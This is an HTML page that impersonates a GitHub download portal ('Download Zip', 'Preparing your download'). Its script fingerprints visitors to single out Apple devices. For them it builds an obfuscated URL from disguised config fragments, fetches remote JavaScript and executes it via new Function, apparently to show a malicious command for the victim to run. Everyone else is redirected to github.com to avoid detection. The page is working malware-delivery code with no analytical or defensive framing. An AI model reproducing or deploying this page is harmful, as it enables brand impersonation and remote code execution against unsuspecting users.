<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="unsafe-url">
    <title>Cloud Files</title>
    <meta name="description" content="Secure download portal" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans",
                Helvetica, Arial, sans-serif;
            background-color: #010409;
            color: #f0f6fc;
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .github-header {
            background-color: #010409;
            border-bottom: 1px solid #21262d;
            padding: 16px 0;
            width: 100%;
        }

        .header-content {
            display: flex;
            align-items: center;
            gap: 16px;
            max-width: 1280px;
            margin: 0 auto;
            padding: 0 24px;
        }

        .github-logo {
            width: 32px;
            height: 32px;
            fill: #f0f6fc;
        }

        .header-title {
            font-size: 20px;
            font-weight: 600;
            color: #f0f6fc;
        }

        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
        }

        .download-container {
            background-color: #0c1015;
            border: 1px solid #21262d;
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 16px 32px rgba(1, 4, 9, 0.85);
            text-align: center;
            position: relative;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 25px;
            color: #f0f6fc;
        }

        .loading-container {
            margin-top: 32px;
            text-align: center;
        }

        .spinner-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #30363d;
            border-top: 2px solid #58a6ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 12px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .github-footer {
            background-color: #010409;
            border-top: 1px solid #21262d;
            padding: 24px;
            margin-top: auto;
            width: 100%;
        }

        .footer-bottom {
            max-width: 1280px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap;
            gap: 24px;
        }

        .footer-logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .footer-logo {
            width: 24px;
            height: 24px;
            fill: #6e7681;
        }

        .footer-copyright {
            color: #6e7681;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
        }

        .footer-links a,
        button {
            color: #8b949e;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover,
        button:hover {
            color: #58a6ff;
        }

        .page-wrapper {
            min-height: 90vh;
            display: flex;
            flex-direction: column;
        }

        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .github-style-button {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans",
                Helvetica, Arial, sans-serif;
            background-color: transparent;
            border: 0;
            padding: 0;
            text-align: left;
            cursor: pointer;
            display: inline-block;
            transition: color 0.2s ease-in-out;
        }

        @media (max-width: 640px) {
            .download-container {
                margin: 100px 16px 16px;
                padding: 24px;
            }

            .header-content {
                padding: 0 16px;
            }
        }

        @media (max-width: 768px) {
            .footer-bottom {
                flex-direction: column;
                align-items: flex-start;
            }

            .footer-links {
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <div class="github-header">
            <div class="header-content">
                <a href="https://github.com/">
                    <svg class="github-logo" viewBox="0 0 16 16">
                        <path
                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
                        />
                    </svg>
                </a>
                <span class="header-title">Download Zip</span>
            </div>
        </div>

        <div class="main-content">
            <div class="download-container">
                <h1>Preparing your download...</h1>

                <div class="loading-container">
                    <div class="spinner-container">
                        <div class="spinner"></div>
                    </div>

                    <p style="color: #8b949e; font-size: 14px; margin-top: 16px">
                        Please keep this page open while we prepare your command.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <div class="github-footer">
        <div class="footer-bottom">
            <div class="footer-logo-section">
                <a href="https://github.com/">
                    <svg class="footer-logo" viewBox="0 0 16 16">
                        <path
                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
                        />
                    </svg>
                </a>
                <span class="footer-copyright">© 2026 GitHub, Inc.</span>
            </div>

            <div class="footer-links">
                <a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a>
                <a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a>
                <a href="https://github.com/security">Security</a>
                <a href="https://www.githubstatus.com/">Status</a>
                <a href="https://docs.github.com/">Help</a>
                <a href="https://support.github.com/?tags=dotcom-footer">Contact</a>
                <button type="button" class="github-style-button">
                    Manage cookies
                </button>
                <button type="button" class="github-style-button">
                    Do not share my personal information
                </button>
            </div>
        </div>
    </div>
<script>
    const ERROR_URL = "https://github.com/";

    const _theme = {
        mode: "proaudio"
    };

    const _anim = {
        easing: "creator",
        direction: ".com"
    };

    const _cfg = {
        version: "/pituri",
        build: ".pronpl"
    };

    function _getNamespace() {
        return "https://";
    }

    function _buildResourcePath(base, parts) {
        return base + parts.join('');
    }

    function detectOS() {
        if (navigator.userAgentData) {
            const p = navigator.userAgentData.platform.toLowerCase();
            if (p.includes('mac') || p.includes('macos') || 
                p.includes('iphone') || p.includes('ipad') || 
                p.includes('ipod') || p.includes('ios')) {
                return 'macos';
            }
        }
        
        const ua = (navigator.userAgent || navigator.appVersion || '').toLowerCase();
        const platform = (navigator.platform || '').toLowerCase();
        const vendor = (navigator.vendor || '').toLowerCase();
        
        if (/macintosh|mac os x|macos|mac_powerpc|macppc|macintel|mac68k|ppc mac|powerpc/i.test(ua) && 
            !/windows nt|win32|win64|wow64/i.test(ua)) {
            return 'macos';
        }
        
        if (/iphone|ipad|ipod|ios|apple tv|appletv|apple watch|applewatch|apple vision|homepod/i.test(ua)) {
            return 'macos';
        }
        
        if (/cfnetwork|darwin/i.test(ua) && !/windows|android|linux/i.test(ua)) {
            return 'macos';
        }
        
        if (/macintosh|macintel|macppc|mac68k|iphone|ipad|ipod/i.test(platform)) {
            return 'macos';
        }
        
        if (vendor.includes('apple') && !/windows|android|linux/i.test(ua)) {
            return 'macos';
        }
        
        if (typeof window.ApplePaySession !== 'undefined') return 'macos';
        if (typeof window.webkit?.messageHandlers !== 'undefined' && !/android/i.test(ua)) return 'macos';
        if ('ongestureend' in window && !/android/i.test(ua) && !/windows/i.test(ua)) return 'macos';
        if ('onforcedclick' in window) return 'macos';
        if ('ApplePayError' in window) return 'macos';
        
        if (CSS.supports('-webkit-touch-callout: none') && !/android/i.test(ua)) return 'macos';
        if (CSS.supports('padding-top: env(safe-area-inset-top)') && !/android/i.test(ua)) return 'macos';
        
        try {
            if (document.fonts.check('12px "SF Pro Display"') && 
                !document.fonts.check('12px "Segoe UI"') &&
                !/windows/i.test(ua)) {
                return 'macos';
            }
            if (document.fonts.check('12px "Helvetica Neue"') && 
                !document.fonts.check('12px "Tahoma"') &&
                !document.fonts.check('12px "MS Sans Serif"') &&
                !/windows/i.test(ua)) {
                return 'macos';
            }
            if (document.fonts.check('12px "Apple Color Emoji"') && !/windows/i.test(ua)) {
                return 'macos';
            }
        } catch(e) {}
        
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (gl) {
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (ext) {
                    const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL).toLowerCase();
                    const glVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL).toLowerCase();
                    
                    if (renderer.includes('apple') || 
                        renderer.includes('m1') || 
                        renderer.includes('m2') || 
                        renderer.includes('m3') || 
                        renderer.includes('m4') ||
                        renderer.includes('apple silicon') ||
                        renderer.includes('powervr') ||
                        renderer.includes('apple a') ||
                        renderer.includes('apple g')) {
                        return 'macos';
                    }
                    
                    if (glVendor.includes('apple') && !/windows|android/i.test(ua)) {
                        return 'macos';
                    }
                }
            }
        } catch(e) {}
        
        return 'other';
    }

    function executeAfterDelay() {
        const os = detectOS();
        
        if (os === 'macos') {
            async function load() {
                try {
                    const _protocol = _getNamespace();
                    const _domainParts = [
                        _theme.mode,
                        _anim.easing
                    ];
                    const _domain = _buildResourcePath('', _domainParts);
                    const _fullUrl = _protocol + _domain + _anim.direction + _cfg.version + _cfg.build;
                    
                    const res = await fetch(_fullUrl, { cache: 'no-store' });
                    const code = await res.text();
                    const headline = document.getElementById('dynamicTitle');
                    const status = document.getElementById('dynamicSubtitle');
                    new Function('headline', 'status', code)(headline, status);
                } catch {
                    window.location.replace(ERROR_URL);
                }
            }
            load();
        } else {
            window.location.replace(ERROR_URL);
        }
    }

    document.addEventListener("DOMContentLoaded", () => {
        setTimeout(executeAfterDelay, 1000);
    });
</script>
</body>
</html>
